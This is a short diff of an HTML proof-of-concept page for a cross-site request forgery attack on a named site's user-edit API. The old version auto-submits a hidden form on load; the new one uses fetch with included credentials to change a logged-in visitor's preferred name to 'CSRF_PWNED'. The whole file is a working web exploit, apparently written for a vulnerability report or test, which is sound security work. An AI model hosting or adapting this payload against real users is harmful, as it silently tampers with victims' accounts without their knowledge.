@@ -1,7 +1,16 @@
 <html>
-  <body onload="document.forms[0].submit()">
-    <form action="https://api.empireflippers.com/api/v1/users/edit" method="POST" enctype="application/json">
-      <input type="hidden" name="preferred_name" value="PwnedByCSRF">
-    </form>
+  <body>
+    <script>
+      fetch("https://api.empireflippers.com/api/v1/users/edit", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          preferred_name: "CSRF_PWNED"
+        })
+      });
+    </script>
   </body>
 </html>
